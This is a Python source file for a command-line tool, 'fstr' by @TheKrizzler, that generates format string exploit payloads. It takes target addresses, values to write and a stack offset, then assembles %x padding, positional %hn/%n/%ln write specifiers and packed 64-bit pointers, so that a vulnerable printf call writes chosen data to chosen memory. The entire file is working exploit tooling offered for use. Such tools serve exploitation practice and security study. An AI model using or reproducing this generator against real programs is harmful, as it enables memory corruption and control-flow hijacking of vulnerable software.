from colorama import Fore, Style
import argparse

class FormatString:
	def __init__(self,writes: dict,prepend: str,append: str,offset=0):
		self.writes = writes
		self.prepend = prepend.encode()
		self.append = append.encode()
		self.offset = offset
		self.formatString = b''
		self.padding = 0

	def unnecessaryHeader():
		print(Fore.CYAN+Style.BRIGHT+'  __       _         ')
		print(Fore.CYAN+Style.NORMAL+' / _|     | |        ')
		print(Fore.CYAN+Style.DIM+'| |_  ___ | |_  _ __ ')
		print(Fore.GREEN+Style.DIM+'|  _|/ __|| __|| \'__|')
		print(Fore.GREEN+Style.NORMAL+'| |  \\__ \\| |_ | |   ')
		print(Fore.GREEN+Style.BRIGHT+'|_|  |___/ \\__||_|   '+Fore.RESET+Style.RESET_ALL)
		print(Fore.GREEN+Style.BRIGHT+'by @TheKrizzler'+Fore.RESET+Style.RESET_ALL)

	def info(self,info):
		print(f'[{Fore.BLUE}*{Fore.RESET}] {info}')

	def debug(self,info):
		print(f'[{Fore.RED}DEBUG{Fore.RESET}] {info}')

	def error(self,info):
		print(f'[{Fore.RED}ERROR{Fore.RESET}] {info}')

	def _createFormatString(self):
		# We split the format string into three parts: format specifiers, padding, and addresses.

		# Define addresses
		# Each address is split into 4 separate addresses for each word of the desired 64-bit region
		parsedWrites = self._parseDictToList(self.writes)
		splitWrites = self._splitWrites(parsedWrites)
		addresses = b''
		for address,data,size in splitWrites:
			addresses += self._intToPointer64(address)

		# Handle all format specifiers
		formatSpecifiers = self._createFormatSpecifiers(splitWrites)

		# Handle padding and offsets
		#
		# This part was difficult because the amount of digits in each format specifier changes the total length.
		# This means i have to set a limitation at three digits, meaning no offset can be higher than 999.
		# For example, %1337x%999$hn
		#
		# This should not be a problem for most use cases, but it can be patched to a higher number if needed.
		finalBString = self._craftFinalString(formatSpecifiers,addresses) + self.append

		return finalBString

	def craft(self):
		self.formatString = self._createFormatString()
		self.info(self.formatString)
		self.info(f'Length: {len(self.formatString)}')
		return self.formatString

	def _parseDictToList(self,dictionary):
		finalList = []
		for address,data in dictionary.items():
			finalList.append((address,data))
		return finalList

	def _intToPointer64(self,num) -> bytes:
		pointer = hex(num)[2:]
		if len(pointer) % 2 == 1:
			pointer = '0'+pointer
		pointer = bytes.fromhex(pointer)[::-1].ljust(8,b'\0')
		return pointer

	# Splits one write into four writes or less, based on values to write
	def _splitWrites(self,tuples):
		initialList = []
		finalList = []
		# Split in four
		for entry in tuples:
			for i in range(4):
				initialList.append((entry[0]+(i*2),(entry[1] >> (16*i)) & 0xFFFF,2))
		# Check for consecutive null-byte writes for optimization
		for index in range(0,len(initialList)-1,2):
			if initialList[index+1][0] - initialList[index][0] == 2 and initialList[index][1] + initialList[index+1][1] == 0:
				finalList.append((initialList[index][0],initialList[index][1],4))
			else:
				finalList.append((initialList[index][0],initialList[index][1],2))
				finalList.append((initialList[index+1][0],initialList[index+1][1],2))

		return sorted(finalList,key=lambda x: x[1])

	# This function relies on the 'writes' parameter being sorted by index 1 in each element
	def _createFormatSpecifiers(self,writes):
		totalWritten = 0
		formatSpecifiers = self.prepend
		for address,data,size in writes:
			if data == 0:
				match size:
					case 2:
						formatSpecifiers += b'%#NUM#$hn'
					case 4:
						formatSpecifiers += b'%#NUM#$n'
					case 8:
						formatSpecifiers += b'%#NUM#$ln'
			else:
				if data - totalWritten != 0:
					formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
					totalWritten += (data - totalWritten)
				else:
					formatSpecifiers += b'%#NUM#$hn'
		return formatSpecifiers

	def _craftFinalString(self,formatSpecifiers,addresses):
		initialFmtSpLength = len(formatSpecifiers.replace(b'#NUM#',b''))
		maxOffsetLength = len(addresses)//8*3	# Change the multiple here to increase max offset
		maxFmtSpLength = initialFmtSpLength + maxOffsetLength
		self.padding = 8 - maxFmtSpLength%8

		offsets = [i+(maxFmtSpLength+self.padding)//8 for i in range(self.offset,self.offset+len(addresses)//8)]
		offsetDigitsLength = self._strlenOfIntList(offsets)
		self.padding += maxOffsetLength - offsetDigitsLength
		#self.debug(f'{offsets=},{self.padding=}')

		finalBString = self._formatBytestring(formatSpecifiers,offsets) + b'.'*self.padding + addresses
		return finalBString

	def _formatBytestring(self,bytestring,offsetList):
		i = 0
		listIndex = 0
		newBytestring = b''
		if len(offsetList) != bytestring.count(b'#NUM#'):
			self.error(f'Length of offsetList does not match amount of writes')
			self.debug(f'{offsetList=},{bytestring.count(b"#NUM#")=}')
		while i < len(bytestring):
			if bytestring[i:i+5] == b'#NUM#':
				newBytestring += str(offsetList[listIndex]).encode()
				i += 5
				listIndex += 1
			else:
				newBytestring += bytes([bytestring[i]])
				i += 1
		return newBytestring
	
	def _strlenOfIntList(self,intList):
		strlen = 0
		for num in intList:
			strlen += len(str(num))
		return strlen

def main():
	# Handle cli use
	argParser = argparse.ArgumentParser('Craft format string payloads')
	argParser.add_argument('-w','--write',action='append',help='REQUIRED. Specify a single address:data pair in hex, i.e 0x404000:0x1337. Can be used multiple times.',type=str)
	argParser.add_argument('-o','--offset',default=0,help='Specify offset at which your input is found using a format string vulnerability',type=int)
	argParser.add_argument('-p','--prepend',default='',help='Specify a bytestring to prepend to the payload',type=str)
	argParser.add_argument('-a','--append',default='',help='Specify a bytestring to append to the payload',type=str)
	argParser.add_argument('--raw',action='store_true',help='Outputs the only final payload as raw bytes.')
	args = vars(argParser.parse_args())

	if args['write'] and args['raw']:
		writes = parseWrites(args['write'])
		fmtstr = FormatString(writes=writes,prepend=args['prepend'],append=args['append'],offset=args['offset'])
		print(fmtstr._createFormatString().decode())
	elif args['write'] and not args['raw']:
		FormatString.unnecessaryHeader()
		writes = parseWrites(args['write'])
		fmtstr = FormatString(writes=writes,prepend=args['prepend'],append=args['append'],offset=args['offset'])
		fmtstr.craft()
	else:
		FormatString.unnecessaryHeader()
		argParser.print_help()

def parseWrites(writes):
    writesDict = {}
    for write in writes:
        address, data = write.split(":")
        writesDict[int(address, 16)] = int(data,16)
    return writesDict

if __name__ == '__main__':
	main()